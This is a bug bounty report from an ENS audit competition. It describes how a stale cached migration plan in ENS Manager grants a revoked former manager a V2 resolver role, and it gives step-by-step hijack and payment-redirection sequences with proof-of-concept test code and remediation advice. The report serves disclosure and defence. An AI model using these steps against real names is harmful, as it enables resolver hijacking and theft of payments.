# 92156 w a medium usemigrationgasestimate preserves an authority bearing plan after manager revocation restoring a revoked address during v1 to v2 migration

**Submitted on Sep 7th 2026 at 15:50:41 UTC by @go4ko for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92156
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

ENS Manager can finish constructing a migration plan while address A is the legitimate V1 Registry manager, keep that plan ready after the registrant revokes A, and later execute the unchanged pre-revocation calldata. Even after a completed fresh V1 response updates the real QueryClient cache to show the registrant V as the current manager, the plan-bearing migration-gas-estimate query still contains A because its identity includes selected domain IDs but omits manager-bearing domain state.

When V clicks the ordinary confirmation button, MigrationPage submits that retained plan to the production migration state machine. The victim-authorized HCA transaction grants the exact V2 ROLE\_SET\_RESOLVER role to revoked address A and no role to the correct live manager V. The wallet-confirmation UI only says “Restore the existing managers” and does not identify the grantee.

The end-to-end PoC then proves concrete consequences. A changes the migrated name to an attacker-controlled PermissionedResolver, Universal Resolver returns an attacker-selected EOA, and a separately generated payer sends exactly 0.01 ETH to that resolved address. V restores the legitimate resolver, but the repair does not remove A’s stale role. A therefore re-hijacks the resolver without another victim signature.

### Security invariant and actors

For an eligible unwrapped .eth 2LD, registration ownership and V1 Registry manager authority are distinct:

* **V** — victim, BaseRegistrar token owner, migration signer, and live V1 manager after revocation;
* **A** — former V1 manager, valid when preview was built but revoked before confirmation;
* **R** — fresh attacker-controlled address returned after resolver hijacking;
* **P** — independently generated payer account, distinct from recipient R;
* **HCA** — V’s migration account, used by the production Manager flow.

The required authorization invariant is:

```
At the final migration authorization boundary, every V2 manager-role grantee
for an unwrapped name must equal the live V1 Registry owner of that name.

If the live V1 manager equals the registrant, no separate manager-role grant
must be emitted.
```

The vulnerable state transition is:

```
V1 subgraph domain.owner = A
    -> Manager builds a fully ready A-bearing migration plan
    -> V executes BaseRegistrar.reclaim(tokenId, V)
    -> A loses V1 authority and still has no V2 authority
    -> a completed fresh V1 response updates QueryClient to V
    -> migration-gas-estimate retains the same query identity and A-bearing plan
    -> V confirms the ordinary migration flow
    -> victim-authorized HCA executes grantRoles(resource, 1 << 24, A)
    -> A replaces the V2 resolver
    -> Universal Resolver returns R and P pays R
    -> V repairs the resolver, but A’s role remains
    -> A replaces the resolver again without another signature from V
```

## Vulnerability Details

#### 1. Manager identity is derived from indexed V1 domain data

The in-scope [V1 subgraph client](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L22-L47) requests both owner.id and registrant.id. For an unwrapped .eth name, the contextual [classification helper](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L148-L186) interprets a different Registry owner as a separate manager:

```ts
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

Accordingly, a domain object fetched while A is manager becomes a classified name whose managerAddress is A. That is valid for previewing the then-current state. It becomes unsafe when the application later treats that old value as authority for a new on-chain role without checking the live Registry again.

#### 2. The plan cache identity excludes manager-bearing state

[useMigrationGasEstimate](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L49-L109) selects complete V1 domain objects but derives the query identity only from their IDs:

```ts
const domainIds = domains
  .map((domain) => domain.id)
  .sort()
  .join(',')

const query = useQuery({
  queryKey: [
    'migration-gas-estimate',
    ownerAddress?.toLowerCase() ?? '',
    hcaAddress?.toLowerCase() ?? '',
    domainIds,
    selectionRevisionRef.current.revision,
  ],
  queryFn: async () => {
    const plan = await buildMigrationPlan({
      domains,
      hcaAddress,
      migrationOwner: ownerAddress,
      publicClient,
      preflight,
    })
    return { estimate, plan }
  },
})
```

Changing domain.owner.id from A to V does not alter the name ID, domainIds, or the selection revision. The cached result is security-sensitive because it contains the complete MigrationPlan and its encoded outer calls, not merely a display-only gas figure.

The primary PoC takes a full snapshot of the ready plan before revocation:

* TanStack query hash;
* dataUpdatedAt;
* HCA address;
* migration owner;
* classified manager address; and
* every encoded HCA outer call.

After V revokes A, the test triggers and awaits an active V1-only QueryClient refetch. The route counter advances only after the V-bearing response has been fulfilled. The test then establishes all of the following before confirmation:

```
current V1 cache manager == V
ready plan manager == A
ready plan after revocation deep-equals the complete pre-revocation snapshot
fresh response completion time <= confirmation start time
```

The preserved run received two completed post-revocation V-bearing responses. This rules out an explanation in which confirmation simply raced ahead of the fresh response.

#### 3. buildMigrationPlan turns the retained object into executable authority

[buildMigrationPlan](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildMigrationPlan.ts#L317-L380) classifies the supplied domains and passes the resulting managerAddress into atomic-batch construction. It does not independently read V1Registry.owner(namehash(name)).

The final negative controls call this frozen production function directly:

* With A as manager, the fresh plan contains one exact resolver-role grant to A.
* After an A-to-V change, a newly constructed plan normalizes managerAddress to null and emits no manager execution, no grantRoles call, and no manager-role verification expectation.
* After an A-to-B change, a newly constructed plan grants B exactly once and emits no grant or expectation for A.

These controls show that granting A is not required by migration semantics. It occurs only because Manager executes the retained pre-revocation plan instead of constructing or validating a current one.

#### 4. MigrationPage submits the old plan without reconciling its grantee

[MigrationPage](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L175-L200) receives the current v1Names array and exposes the gas-estimate result to the selection UI. Its [handleBeginUpgrade](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L259-L299) only requires the result to have ready status before forwarding its plan:

```ts
if (gasEstimate.status !== 'ready') return false

uiActor.send({
  type: 'migration.start',
  plan: gasEstimate.plan,
  signer,
  hcaClient,
  refreshAccount,
})
```

There is no comparison between gasEstimate.plan.classified\[].managerAddress and either the freshly updated V1 query data or the live V1 Registry at this boundary. Consequently, the exact calldata produced before revocation remains eligible for victim authorization afterward.

#### 5. The stale manager becomes an exact V2 role grant

[buildRoleGrantCall](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L24) converts managerAddress into:

```ts
grantRoles(resource, 1 << 24, managerAddress)
```

[buildAtomicMigrationBatches](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624) inserts that call into the HCA batch and creates a verification expectation for the same address. Verification is therefore internally consistent with the stale plan: it proves that A received the role the plan requested, but never proves that A remains the legitimate V1 manager.

The E2E captures the expected HCA from the production plan before revocation. Its transaction scanner accepts only transactions:

```
transaction.from == V
transaction.to == plan-captured HCA
outer function == executeByOwner
```

It decodes the real mined calldata and requires:

```
exact resolver-role grants to A == 1
exact resolver-role grants to V == 0
role bitmap == 1 << 24
```

After migration, the complete role word stored for A must also equal exactly 1 << 24. This excludes an unrelated role, a bitmap superset, or an inferred transaction as explanations for the result.

#### 6. Existing freshness checks validate different state

[computeMigrationPreflight](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/computeMigrationPreflight.ts#L192-L259) checks migration approvals, resolver readiness, profile data, direct routes, HCA readiness, and required code after classifying the supplied domains. It does not read the live V1 Registry manager.

[assertMigrationApprovalPlanCurrent](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L367-L390) recomputes missing approvals and compares approval identifiers. An A-to-V manager transition can leave the relevant approval shape unchanged, while the security-sensitive role recipient has changed.

The retry-time [source ownership guard](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L705-L750) checks BaseRegistrar ownerOf for an unwrapped name. V remains that token owner throughout this PoC, so the guard cannot detect a Registry-manager-only transition. [Retry batch construction](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L886-L927) also reuses already classified names.

#### 7. Confirmation does not identify the restored address

[WalletConfirmationStepsDialog](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89) displays generic text:

```
Approve manager restoration
Restore the existing managers for your names.
```

The E2E opens this production dialog and confirms that neither A nor V is displayed. The hidden grantee is not the root cause—execution must reject stale authority regardless of presentation—but the UI gives the victim no usable warning that “existing manager” refers to an address they already revoked.

### State transition demonstrated by the E2E

| Stage                         | BaseRegistrar owner | Live V1 manager | Current V1 cache | Ready plan                       | A’s V2 role         | Security result                                                        |
| ----------------------------- | ------------------- | --------------- | ---------------- | -------------------------------- | ------------------- | ---------------------------------------------------------------------- |
| Initial legitimate delegation | V                   | A               | A                | Not ready                        | None                | A is an authorized V1 manager.                                         |
| Production preview ready      | V                   | A               | A                | Grants A exactly 1 << 24         | None                | Plan is correct only for this moment.                                  |
| V revokes A in a later block  | V                   | V               | A initially      | Still grants A                   | None                | A cannot write either V1 or V2 resolver state.                         |
| Fresh V1 refetch completes    | V                   | V               | **V**            | **Unchanged A-bearing calldata** | None                | Browser security state is internally inconsistent before confirmation. |
| V confirms migration          | V                   | V               | V                | A-bearing plan executes          | **Exactly 1 << 24** | Victim-signed HCA restores revoked A and grants V nothing separately.  |
| First hijack and payment      | V                   | V               | V                | Executed                         | Present             | Universal Resolver returns R and P sends 0.01 ETH to R.                |
| V repairs resolver            | V                   | V               | V                | Executed                         | Present             | Resolution is temporarily restored, but stale authorization survives.  |
| A re-hijacks                  | V                   | V               | V                | No new plan                      | Present             | A redirects resolution again without another victim signature.         |

### Attack sequence

1. V owns an eligible unwrapped V1 .eth registration and has legitimately appointed A as its V1 Registry manager.
2. V opens ENS Manager and proceeds to the migration selection page.
3. Manager receives a V1 domain object whose owner.id is A and builds a complete ready migration plan.
4. The plan contains exactly one ROLE\_SET\_RESOLVER grant to A and no separate grant to V.
5. Before confirming that ready plan, V uses the ordinary BaseRegistrar reclaim operation to make V the live V1 Registry manager.
6. The revocation is mined in a block later than the ready-plan snapshot.
7. A now has no V1 authority, has no V2 resolver role, and cannot call either V1 or V2 setResolver.
8. A fresh V-bearing V1 response completes and updates the real Manager QueryClient cache.
9. Because only manager-bearing domain content changed, the migration-gas-estimate query identity remains unchanged and continues exposing the exact A-bearing plan and calldata.
10. The production confirmation dialog describes generic manager restoration without disclosing A or V.
11. V clicks the normal confirmation button and authorizes the production wallet requests.
12. The application sends a victim-originated executeByOwner transaction to the HCA captured from the ready plan.
13. The successful inner batch grants resource-specific role 1 << 24 to A, grants no corresponding role to V, completes the migration with V as V2 owner, and removes the HCA’s temporary broad approval.
14. A uses the newly granted per-name role to install an attacker-controlled PermissionedResolver.
15. Universal Resolver resolves the victim’s name to R.
16. Fresh payer P transfers exactly 0.01 ETH to the resolved address, increasing R’s balance by that amount.
17. V restores the legitimate resolver using owner authority.
18. Because resolver repair does not revoke A’s role, A installs the attacker resolver again without any new action or signature from V.

### Preconditions and practical likelihood

#### Internal preconditions

1. V owns an eligible unwrapped V1 .eth 2LD.
2. A is the legitimate V1 manager when the migration preview is created.
3. The preview reaches ready state.
4. V changes the V1 manager without changing the BaseRegistrar token owner or selected name ID.
5. V confirms the still-mounted migration flow without leaving the page and rebuilding the plan.

#### External ordering condition

The plan must be created before the manager change and remain mounted until confirmation. This is a conditional state transition, not an unconditional takeover, and the report does not claim otherwise.

The sequence remains reachable through ordinary behavior: a registrant can prepare migration, revoke or normalize a delegated manager in another tab or wallet action, return to the ready preview, and continue. The PoC uses no timing race at the final click. It explicitly waits for the revocation receipt, awaits a fresh V1 refetch, proves the current cache contains V, and only then confirms the unchanged plan.

No ENS administrator, registrar controller, HCA owner other than V, project operator, wallet provider, or third-party service must act maliciously. A is not treated as trusted after revocation; exploiting authority that the system unexpectedly regrants to a former delegate is the attacker model, not a malicious privileged-role assumption.

### Why existing controls do not stop the issue

| Existing control               | What it establishes                                                              | Why the stale grant remains possible                                                       |
| ------------------------------ | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| BaseRegistrar ownerOf check    | V still owns the registration token                                              | It does not identify the live V1 Registry manager.                                         |
| Migration preflight            | Infrastructure, approvals, routes, profiles, resolvers, and HCA state are usable | It classifies the supplied domain object and never re-reads V1 Registry manager authority. |
| Approval-plan freshness        | Planned and currently missing approvals have the same identifiers                | The manager grantee is not part of this comparison.                                        |
| Ready gas estimate             | The retained plan simulated successfully                                         | Successful simulation does not establish that its role recipient is still authorized.      |
| Manager-role verification      | The planned address received the planned role                                    | It verifies the unsafe request rather than the legitimacy of its recipient.                |
| Temporary HCA approval cleanup | HCA’s broad operator approval was removed                                        | A’s per-resource ROLE\_SET\_RESOLVER is independent and remains active.                    |
| V2 ownership                   | V becomes and remains the migrated name owner                                    | Resolver roles can authorize A while V still appears as owner.                             |
| Resolver repair                | V can point the name back to the legitimate resolver                             | Repair does not revoke A, so A can immediately replace it again.                           |
| Confirmation copy              | V is told that managers will be restored                                         | The address, affected name-to-grantee mapping, and exact role are not shown.               |

### Known-issue distinction

This finding is not the same root cause as any disclosed competition issue:

| Disclosed or related issue                                                                                                                  | Distinction                                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SEC-TXM-002 — configured/cached smart-account address is not cross-checked                                                                  | SEC-TXM-002 concerns accepting an HCA address without comparing it to SDK derivation. Here the production HCA is captured from the plan and the mined transaction is required to target that same HCA. The wrong value is the role grantee retained inside Manager’s migration plan.    |
| [ensdomains/contracts-v2 issue #418](https://github.com/ensdomains/contracts-v2/issues/418) — delegated roles survive V2 ownership transfer | Issue #418 concerns an already-existing role surviving an ERC-1155 ownership transfer. This PoC performs no V2 ownership transfer and proves A’s V2 role is zero before migration. Manager’s victim-signed migration transaction creates a new role for A only after V revoked A in V1. |
| QA-01 and transfer-role follow-ups                                                                                                          | Those disclosures concern post-transfer failures or role combinations. This path is an unwrapped V1-to-V2 migration and demonstrates a newly created unauthorized role, resolver hijacking, recipient redirection, and post-repair re-hijacking.                                        |
| WEB-806 — migrated subname records are not visible                                                                                          | WEB-806 is a display/record-visibility issue for migrated subnames. This finding affects an unwrapped .eth 2LD and produces real on-chain resolver authority for a revoked address.                                                                                                     |

The V2 Registry and PermissionedResolver enforce the roles they are given. The vulnerability lies in the in-scope Manager application asking V to grant the correct role to an address whose underlying V1 authority no longer exists.

## Impact Details

The appropriate competition impact is:

> **Critical — Hijacking an ENS name during a Manager V1-to-V2 migration by assigning its resolver authority to an attacker.**

The demonstrated facts map directly to that impact:

* V completes the normal Manager migration and remains the apparent V2 owner.
* The application-generated, victim-authorized HCA transaction grants A a real resource-specific resolver role.
* A was already revoked and could not modify the V1 or V2 resolver before that transaction.
* A installs a genuine attacker-controlled PermissionedResolver afterward.
* The production-compatible Universal Resolver path returns attacker-selected address R.
* A distinct payer transfers exactly 0.01 ETH to the resolved recipient.
* V’s ordinary resolver repair does not remove A’s authority.
* A re-hijacks the name without another victim signature.

ENS resolution is commonly relied upon for payment addressing, identity, content, and application routing. While the malicious resolver is installed, any wallet or integration resolving the name can be directed to attacker-selected records. The preserved payment demonstrates the full recipient-redirection mechanism instead of assuming that a changed resolver is automatically impactful.

The report does not claim that A permanently owns the name, that recovery is impossible, or that the local-fork ETH represents production loss. V remains owner and can revoke A’s role once the hidden authorization is discovered. The scoped impact explicitly includes hijacking, attacker resolver assignment, and recipient redirection; irreversible ownership loss is not required.

## Risk Breakdown

| Gate                                                    | Verdict | Evidence                                                                                                                                 |
| ------------------------------------------------------- | ------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Can Manager execute the stale plan?                     | **YES** | The complete ready-plan snapshot remains equal after revocation and fresh V1 refetch, then succeeds through the production UI.           |
| Is the wrong grantee bound to the victim’s transaction? | **YES** | The decoder accepts one victim-originated executeByOwner call to the plan-captured HCA and finds exactly one grant to A and zero to V.   |
| Is A unauthorized before migration?                     | **YES** | Live V1 manager is V, A’s V2 role is zero, and A’s V1/V2 resolver-write simulations revert.                                              |
| Does the transaction create persistent authority?       | **YES** | A’s post-migration role word equals exactly 1 << 24 and survives V’s resolver repair.                                                    |
| Is there a concrete third-party consequence?            | **YES** | Universal Resolver returns R and independently generated payer P transfers exactly 0.01 ETH to R.                                        |
| Does the path require a malicious protocol role?        | **NO**  | Privileged impersonation is confined to creation of a local-fork fixture; the exploit uses ordinary V and formerly delegated A behavior. |

Severity is Critical under impact 6286. Likelihood is conditional on the reachable ready-preview-then-manager-change sequence and should be assessed separately from the demonstrated impact.

## Recommended Remediation

Manager identity must be handled as live authorization state rather than immutable indexed input.

### Required fix

For every unwrapped name, enforce the following immediately before the final user authorization and whenever a transaction batch is rebuilt:

```
planned manager == V1Registry.owner(namehash(name))
```

If the live manager differs from the previewed value:

1. invalidate the existing MigrationPlan;
2. return the user to review or construct a new plan;
3. require fresh confirmation for the changed calldata; and
4. omit a separate manager-role grant when the live manager equals the registrant.

Where the migration architecture permits it, place the authority assertion in the same atomic execution path as the V2 grant to remove the read-to-submit gap. A browser-only freshness read materially improves this path but cannot provide the same race resistance as an on-chain assertion.

### Defense in depth

* Include a canonical fingerprint of security-bearing domain fields in the migration-gas-estimate key: at minimum domain ID, owner.id, registrant.id, and relevant wrapped-owner data.
* Add an assertMigrationManagerPlanCurrent guard adjacent to the existing approval-plan freshness guard.
* Re-read live V1 manager state before every retry or rebuilt batch instead of reusing plan.classified.
* Treat a V1 response that changes only manager data as an explicit plan invalidation event.
* Display each selected name, planned manager address, target registry, and role bitmap in the wallet-confirmation details.
* Add regression tests covering A-to-V and A-to-B transitions after preview readiness, including a completed fresh V1 response under an unchanged selected-name ID.
* Preserve the negative controls included with this report: a fresh A-to-V plan must have no separate grant, while a fresh A-to-B plan must grant B and never A.

Changing only the wording of the confirmation dialog is insufficient. Changing only the cache key also leaves open other stale or adversarial data paths. The final authorization boundary must validate the grantee.

## References

* [useMigrationGasEstimate query identity and plan result](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts#L49-L109)
* [V1 names QueryClient source](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L29)
* [MigrationPage consumes current V1 names and gas estimate](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L167-L200)
* [MigrationPage submits gasEstimate.plan](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/pages/MigrationPage.tsx#L259-L299)
* [Unwrapped-name manager classification](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/migration/src/service/classifyNames.ts#L148-L186)
* [buildMigrationPlan](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildMigrationPlan.ts#L317-L380)
* [computeMigrationPreflight](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/computeMigrationPreflight.ts#L192-L259)
* [buildRoleGrantCall](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L8-L24)
* [Manager-role insertion and verification expectation](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L624)
* [Approval-plan freshness check](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L367-L390)
* [Retry source-token ownership guard](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L705-L750)
* [Retry batch rebuilding](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/service/migrationService.ts#L886-L927)
* [Manager-restoration confirmation text](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89)
* [ENS audit competition scope and known issues](https://immunefi.com/audit-competition/audit-competition-ens/scope/)
* [Related but distinct V2 transfer issue #418](https://github.com/ensdomains/contracts-v2/issues/418)

## Link to Proof of Concept

<https://gist.github.com/0xgo4ko/73662b3adfdf0dba6158ff3d1725fa8f>

## Proof of Concept

## Proof of Concept

### Secret Gist environment and integrity

The complete runnable PoC package is provided in the GitHub Secret Gist below. The Gist supports—but does not replace—the explanation, decisive assertions, reproduction steps, and preserved result in this report. GitHub treats each Gist as a Git repository and provides a Download ZIP action, so reviewers can either clone the pinned revision or download the complete package.

| Gist reference | Value                                                              |
| -------------- | ------------------------------------------------------------------ |
| Web URL        | <https://gist.github.com/0xgo4ko/73662b3adfdf0dba6158ff3d1725fa8f> |
| Clone URL      | <https://gist.github.com/73662b3adfdf0dba6158ff3d1725fa8f.git>     |
| Pinned commit  | 7216db46a7c6b13792cf8dd7c933fe5bbc879b4a                           |

Reviewers should first check out the pinned Gist commit and verify `SHA256SUMS` using the commands below. They should then follow `RUN.md` for environment setup, reproduction, and cleanup. The essential commands are also reproduced below so the report remains self-contained.

The PoC is published as a **Secret** Gist at the pinned URL above and is disclosed through this private competition submission. GitHub Secret Gists are unlisted rather than access-controlled private repositories. The package contains no production credentials or unrelated secrets.

The pinned Gist contains the complete final `ENS-001-Variant-PoC` directory at its repository root:

| File                                         | Purpose                                                                              |
| -------------------------------------------- | ------------------------------------------------------------------------------------ |
| RUN.md                                       | Locked-revision setup, service startup, isolated reproduction output, and cleanup.   |
| EVIDENCE.md                                  | Preserved environment, decisive results, negative controls, and hashes.              |
| ENS-001-ready-plan-revocation.e2e.spec.ts    | Primary production-browser/local-fork E2E.                                           |
| ENS-001-variant.playwright.config.mjs        | Sidecar Playwright configuration.                                                    |
| ENS-001-ready-plan-negative-controls.test.ts | Frozen production-planner A-to-V and A-to-B controls.                                |
| ENS-001-variant.vitest.config.ts             | Sidecar Vitest configuration.                                                        |
| ENS-001-variant-report.raw\.json             | Unmodified machine-generated successful Playwright report.                           |
| ENS-001-variant-vitest-output.txt            | Preserved output for the two negative controls.                                      |
| ENS-001-variant-success-trace.zip            | Raw successful Playwright trace with embedded executed source.                       |
| package.json                                 | ESM and package-manager metadata.                                                    |
| SHA256SUMS                                   | Integrity manifest covering all ten non-manifest package files, including the trace. |

The trace is approximately 11 MB. GitHub may not render its complete raw contents in the browser, but reviewers cloning or downloading the Gist receive the artifact. It contains local machine paths and temporary test-session cookies; do not publish the Gist URL outside the private Immunefi report.

**Role of the supplied trace.** `ENS-001-variant-success-trace.zip` is not a runtime input to the exploit and does not need to be extracted before running the PoC. The E2E source and sidecar configurations execute the exploit independently, and the reproduction command uses Playwright's `--trace on` option to generate a fresh trace under `reproduction-output/`. The supplied trace is preserved, inspectable evidence of the original successful execution. It must nevertheless remain unchanged in the submitted package because `SHA256SUMS` covers it, `RUN.md` verifies its ZIP integrity, and reviewers may inspect the demonstrated execution before reproducing it. Omitting or replacing it would cause the package-integrity check to fail.

If Immunefi exposes a separate private binary-attachment field, attaching the same trace there is optional redundancy; the pinned Gist package is already complete and its manifest verifies the trace.

Clone the pinned Gist and verify the complete environment before reproduction:

```sh
git clone "https://gist.github.com/73662b3adfdf0dba6158ff3d1725fa8f.git" ENS-001-Variant-PoC
cd ENS-001-Variant-PoC
git checkout --detach "7216db46a7c6b13792cf8dd7c933fe5bbc879b4a"
test "$(git rev-parse HEAD)" = "7216db46a7c6b13792cf8dd7c933fe5bbc879b4a"
shasum -a 256 -c SHA256SUMS
unzip -tq ENS-001-variant-success-trace.zip
```

On Linux, use sha256sum -c SHA256SUMS. Verification must report every listed file as OK, and ZIP validation must report no compressed-data errors.

### Evidence boundary

This is a production-browser/local-chain E2E with one controlled indexer boundary. The frozen external V1 indexer cannot observe a name created dynamically inside the local Sepolia fork, so the test serves deterministic V1 GraphQL objects whose manager values remain consistent with separately asserted on-chain state. It does not claim that the public subgraph indexed the dynamic fixture or measure how frequently users naturally enter this ordering.

Test-only RPC impersonation creates the initial registration and reserved V2 slot. The exploit path uses the real Manager UI, QueryClient, migration plan, wallet prompts, victim-authorized HCA, registries, PermissionedResolver, Universal Resolver, payer transaction, victim repair, and attacker re-hijack. None of those security-critical components is mocked.

The test locally enables Manager’s existing migration feature flag only to expose the in-scope migration UI. It does not replace or patch the migration implementation.

### Decisive exploit assertions

The following is an abridged, non-contiguous excerpt from the complete pinned ENS-001-ready-plan-revocation.e2e.spec.ts. It places the central proof directly in the Immunefi PoC field: exact nested calldata decoding, victim/HCA transaction binding, ready-plan snapshotting, later manager revocation, a completed fresh QueryClient response, unchanged executable calldata, exact post-migration role state, recipient redirection, payment, repair, and re-hijack.

Fixture construction, helper type declarations, wallet-authorization plumbing, and unrelated success-UI assertions are omitted. The reproduction steps execute the complete Gist source.

```ts
// Decode only an exact Registry resolver-role grant for the tested resource.
const decodeGrantEvidence = (params: {
  readonly transaction: Transaction
  readonly staleManager: Address
  readonly victim: Address
  readonly resource: bigint
}): GrantEvidence | null => {
  const { transaction, staleManager, victim, resource } = params
  try {
    const outer = decodeFunctionData({
      abi: HcaOwnerExecutionAbi,
      data: transaction.input,
    })
    if (outer.functionName !== 'executeByOwner') return null

    let staleGrantCount = 0
    let victimGrantCount = 0
    const [executions] = outer.args
    for (const execution of executions) {
      if (execution.target.toLowerCase() !== V2_ETH_REGISTRY.toLowerCase()) {
        continue
      }
      try {
        const inner = decodeFunctionData({
          abi: V2RegistryAbi,
          data: execution.callData,
        })
        if (inner.functionName !== 'grantRoles') continue

        const [grantedResource, bitmap, grantee] = inner.args
        const grantsResolverRole =
          grantedResource === resource && bitmap === ROLE_SET_RESOLVER
        if (!grantsResolverRole) continue

        if (grantee.toLowerCase() === staleManager.toLowerCase()) {
          staleGrantCount += 1
        }
        if (grantee.toLowerCase() === victim.toLowerCase()) {
          victimGrantCount += 1
        }
      } catch {
        // Other Registry calls in the production owner batch are irrelevant.
      }
    }

    if (staleGrantCount === 0 && victimGrantCount === 0) return null
    return { transaction, staleGrantCount, victimGrantCount }
  } catch {
    return null
  }
}

// Bind evidence to the victim and HCA captured from the ready production plan.
const scanForExploitEvidence = async ({
  fromBlock,
  victim,
  staleManager,
  resource,
  expectedHca,
}: ScanParams): Promise<GrantEvidence | null> => {
  const currentBlock = await publicClient.getBlockNumber()
  const transactions = await collectTransactions(fromBlock, currentBlock)
  const evidence = transactions
    .filter(
      (transaction) =>
        transaction.from.toLowerCase() === victim.toLowerCase() &&
        transaction.to?.toLowerCase() === expectedHca.toLowerCase(),
    )
    .map((transaction) =>
      decodeGrantEvidence({ transaction, staleManager, victim, resource }),
    )
    .filter((item): item is GrantEvidence => item !== null)

  const staleGrantCount = evidence.reduce(
    (total, item) => total + item.staleGrantCount,
    0,
  )
  const victimGrantCount = evidence.reduce(
    (total, item) => total + item.victimGrantCount,
    0,
  )
  const staleGrantTransactions = evidence.filter(
    (item) => item.staleGrantCount > 0,
  )
  if (
    staleGrantCount !== 1 ||
    victimGrantCount !== 0 ||
    staleGrantTransactions.length !== 1
  ) {
    return null
  }

  const result = staleGrantTransactions[0]
  if (!result) return null

  const [hasStaleRole, temporaryApproval] = await Promise.all([
    publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: V2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, staleManager],
    }),
    publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: V2RegistryAbi,
      functionName: 'isApprovedForAll',
      args: [victim, expectedHca],
    }),
  ])
  return hasStaleRole && !temporaryApproval ? result : null
}

// ... initial fork fixture and attacker resolver preparation omitted ...

// The production plan is fully ready while A is still the legitimate manager.
await expect(confirmUpgrade).toBeEnabled({ timeout: 120_000 })
const cacheBeforeRevocation = await readMigrationCacheState(page, name)
expect(cacheBeforeRevocation.v1Manager?.toLowerCase()).toBe(
  staleManager.address.toLowerCase(),
)
const readyPlanBeforeRevocation = cacheBeforeRevocation.readyPlan
if (!readyPlanBeforeRevocation) {
  throw new Error('Ready migration plan is absent from QueryClient cache')
}
